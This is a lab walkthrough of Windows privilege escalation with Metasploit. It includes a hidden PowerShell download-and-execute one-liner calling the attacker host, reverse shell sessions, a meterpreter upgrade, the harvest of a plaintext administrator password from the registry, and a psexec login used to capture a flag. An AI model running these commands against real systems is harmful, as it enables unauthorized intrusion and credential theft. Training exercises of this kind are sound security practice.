# Windows Privilege Escalation

```bash
msf6 > search web_delivery
msf6 > use exploit/multi/script/web_delivery
msf6 exploit(multi/script/web_delivery) > set target PSH\ (Binary)
target => PSH (Binary)
msf6 exploit(multi/script/web_delivery) > set payload windows/shell/reverse_tcp
payload => windows/shell/reverse_tcp
msf6 exploit(multi/script/web_delivery) > set PSH-EncodedCommand false
PSH-EncodedCommand => false
msf6 exploit(multi/script/web_delivery) > set lhost eth1
lhost => 10.10.38.3
msf6 exploit(multi/script/web_delivery) > run
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.38.3:4444 
msf6 exploit(multi/script/web_delivery) > [*] Using URL: http://10.10.38.3:8080/M9Z0opDhbhavZRo
[*] Server started.
[*] Run the following command on the target machine:
powershell.exe -nop -w hidden -c [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;$z="echo ($env:temp+'\tE9MrdSP.exe')"; (new-object System.Net.WebClient).DownloadFile('http://10.10.38.3:8080/M9Z0opDhbhavZRo', $z); invoke-item $z

# Run the command to target machine
[*] 10.0.18.230      web_delivery - Delivering Payload (73802 bytes)
[*] Sending stage (240 bytes) to 10.0.18.230
[*] Command shell session 1 opened (10.10.38.3:4444 -> 10.0.18.230:49792) at 2025-07-29 13:04:04 +0530

msf6 exploit(multi/script/web_delivery) > sessions

Active sessions
===============

  Id  Name  Type               Information          Connection
  --  ----  ----               -----------          ----------
  1         shell x86/windows  Shell Banner: Micro  10.10.38.3:4444 -> 1
                               soft Windows [Versi  0.0.18.230:49792 (10
                               on 10.0.17763.1457]  .0.18.230)

msf6 exploit(multi/script/web_delivery) > sessions 1
[*] Starting interaction with 1...


Shell Banner:
Microsoft Windows [Version 10.0.17763.1457]
-----
          

C:\Users\student>

C:\Users\student>^Z
Background session 1? [y/N]  y
```

Migrate session
```bash
msf6 exploit(multi/script/web_delivery) > search shell_to
msf6 exploit(multi/script/web_delivery) > use post/multi/manage/shell_to_meterpreter
msf6 post(multi/manage/shell_to_meterpreter) > set lhost eth1
lhost => 10.10.38.3
msf6 post(multi/manage/shell_to_meterpreter) > set WIN_TRANSFER VBS 
WIN_TRANSFER => VBS
msf6 post(multi/manage/shell_to_meterpreter) > set session 1
session => 1
msf6 post(multi/manage/shell_to_meterpreter) > run

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.10.38.3:4433 
[*] Command stager progress: 14.11% (1699/12045 bytes)
[*] Command stager progress: 28.21% (3398/12045 bytes)
[*] Command stager progress: 42.32% (5097/12045 bytes)
[*] Command stager progress: 56.42% (6796/12045 bytes)
[*] Command stager progress: 70.53% (8495/12045 bytes)
[*] Command stager progress: 84.29% (10153/12045 bytes)
[*] Command stager progress: 98.17% (11825/12045 bytes)
[*] Sending stage (201798 bytes) to 10.0.18.230
[*] Command stager progress: 100.00% (12045/12045 bytes)
[*] Post module execution completed

# Migrate to explorer.exe
meterpreter > migrate 4704
[*] Migrating from 2180 to 4704...
[*] Migration completed successfully.
```

Run PrivescCheck
```bash
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeChangeNotifyPrivilege
SeIncreaseWorkingSetPrivilege

meterpreter > cd C:\\
meterpreter > cd Users
meterpreter > cd student
meterpreter > cd Desktop
meterpreter > cd PrivescCheck
meterpreter > dir
Listing: C:\Users\student\Desktop\PrivescCheck
==============================================

Mode           Size    Type  Last modified           Name
----           ----    ----  -------------           ----
100666/rw-rw-  5112    fil   2021-06-14 15:08:54 +0  Build.ps1
rw-                          530
100666/rw-rw-  4812    fil   2021-06-14 15:08:54 +0  CHANGELOG
rw-                          530
100666/rw-rw-  3473    fil   2021-06-14 15:08:54 +0  INFORMATION.md
rw-                          530
100666/rw-rw-  1522    fil   2021-06-14 15:08:54 +0  LICENSE
rw-                          530
100666/rw-rw-  137714  fil   2021-06-14 15:08:54 +0  PrivescCheck.ps1
rw-                          530
100666/rw-rw-  301684  fil   2021-06-14 15:08:54 +0  PrivescCheckOld.ps1
rw-                          530
100666/rw-rw-  3042    fil   2021-06-14 15:08:54 +0  README.md
rw-                          530
040777/rwxrwx  0       dir   2021-06-15 17:02:53 +0  src
rwx                          530

meterpreter > shell
Process 5940 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.1457]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\student\Desktop\PrivescCheck>

# Got to GitHub Repo, copy "Extended checks + human-readable reports" command and run
C:\Users\student\Desktop\PrivescCheck>powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,HTML"
~~~~~~~~
+------+------------------------------------------------+------+
| TEST | CREDS > WinLogon                               | VULN |
+------+------------------------------------------------+------+
| DESC | Parse the Winlogon registry keys and check whether    |
|      | they contain any clear-text password. Entries that    |
|      | have an empty password field are filtered out.        |
+------+-------------------------------------------------------+
[*] Found 1 result(s).


Domain   : 
Username : administrator
Password : hello_123321
~~~~~~~~
+-----------------------------------------------------------------------------+
|                         ~~~ PrivescCheck Report ~~~                         |
+----+------+-----------------------------------------------------------------+
| NA | Info | APPS > ProgramData folders/files -> 108 result(s)               |
| OK | None | APPS > Modifiable Apps                                          |
| NA | Info | APPS > Non-default Apps -> 5 result(s)                          |
| NA | Info | APPS > Startup Apps -> 1 result(s)                              |
| NA | Info | APPS > Running Processes -> 23 result(s)                        |
| OK | None | APPS > Modifiable Startup Apps                                  |
| NA | None | CONFIG > SCCM Cache Folder                                      |
| OK | None | CONFIG > WSUS Configuration                                     |
| OK | None | CONFIG > AlwaysInstallElevated                                  |
| OK | None | CONFIG > PATH Folder Permissions                                |
| OK | None | CONFIG > SCCM Cache Folder                                      |
| OK | None | CREDS > GPP Passwords                                           |
| OK | None | CREDS > SAM/SYSTEM Backup Files                                 |
| NA | None | CREDS > Vault Creds                                             |
| NA | None | CREDS > Vault List                                              |
| KO | Med. | CREDS > WinLogon -> 1 result(s)                                 |
| NA | Info | CREDS > Credential Files -> 4 result(s)                         |
| OK | None | CREDS > Unattend Files                                          |
| NA | None | CREDS > PowerShell History                                      |
| NA | Info | HARDENING > Credential Guard -> 1 result(s)                     |
| NA | Info | HARDENING > UEFI & Secure Boot -> 2 result(s)                   |
| NA | Info | HARDENING > UAC Settings -> 1 result(s)                         |
| NA | Info | HARDENING > LSA Protection (RunAsPPL) -> 1 result(s)            |
| NA | None | HARDENING > BitLocker                                           |
| NA | None | HARDENING > PowerShell Transcription                            |
| NA | None | HARDENING > LAPS Settings                                       |
| NA | Info | MISC > Hijackable DLLs -> 3 result(s)                           |
| NA | Info | MISC > Local Admin Group -> 1 result(s)                         |
| NA | Info | MISC > OS Version -> 1 result(s)                                |
| NA | Info | MISC > Endpoint Protection -> 10 result(s)                      |
| NA | Info | MISC > User Home Folders -> 3 result(s)                         |
| NA | None | MISC > Last System Startup                                      |
| NA | Info | MISC > System Startup History -> 1 result(s)                    |
| NA | Info | MISC > Machine Role -> 1 result(s)                              |
| NA | Info | MISC > Filesystem Drives -> 1 result(s)                         |
| NA | None | NETWORK > Saved Wifi Profiles                                   |
| NA | Info | NETWORK > TCP Endpoints -> 27 result(s)                         |
| NA | Info | NETWORK > UDP Endpoints -> 15 result(s)                         |
| OK | None | SCHEDULED TASKS > Unquoted Path                                 |
| OK | None | SCHEDULED TASKS > Binary Permissions                            |
| OK | None | SERVICES > Service Permissions                                  |
| NA | Info | SERVICES > Non-default Services -> 5 result(s)                  |
| OK | None | SERVICES > Registry Permissions                                 |
| OK | None | SERVICES > SCM Permissions                                      |
| OK | None | SERVICES > Unquoted Path                                        |
| OK | None | SERVICES > Binary Permissions                                   |
| NA | Info | UPDATES > Last Windows Update Date -> 1 result(s)               |
| NA | Info | UPDATES > Installed Updates and Hotfixes -> 20 result(s)        |
| KO | Med. | UPDATES > System up to date? -> 1 result(s)                     |
| NA | Info | USER > Groups -> 13 result(s)                                   |
| NA | Info | USER > Identity -> 1 result(s)                                  |
| NA | None | USER > Restricted SIDs                                          |
| NA | None | USER > Environment Variables                                    |
| NA | Info | USER > Privileges -> 2 result(s)                                |
+----+------+-----------------------------------------------------------------+
```

Access SMB with credentials found
```bash
# Put the session background
msf6 post(multi/manage/shell_to_meterpreter) > search psexec
msf6 exploit(windows/smb/psexec) > set lport 4422
lport => 4422
msf6 exploit(windows/smb/psexec) > set rhosts 10.0.18.230
rhosts => 10.0.18.230
msf6 exploit(windows/smb/psexec) > set smbuser administrator
smbuser => administrator
msf6 exploit(windows/smb/psexec) > set smbpass hello_123321
smbpass => hello_123321
msf6 exploit(windows/smb/psexec) > run

[*] Started reverse TCP handler on 10.10.38.3:4422 
[*] 10.0.18.230:445 - Connecting to the server...
[*] 10.0.18.230:445 - Authenticating to 10.0.18.230:445 as user 'administrator'...
[*] 10.0.18.230:445 - Selecting PowerShell target
[*] 10.0.18.230:445 - Executing the payload...
[+] 10.0.18.230:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (176198 bytes) to 10.0.18.230
[*] Meterpreter session 3 opened (10.10.38.3:4422 -> 10.0.18.230:49880) at 2025-07-29 13:32:16 +0530

meterpreter > 

# Accessed to target with Administrator credentials
# -> Privilege escaleted
```

Find the flag
```bash
meterpreter > shell
Process 4576 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.1457]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>cd C:\\
cd C:\\

C:\>

C:\Users\Administrator\Desktop>type flag.txt
type flag.txt
2b070a650a92129c2462deae7707b0c5
```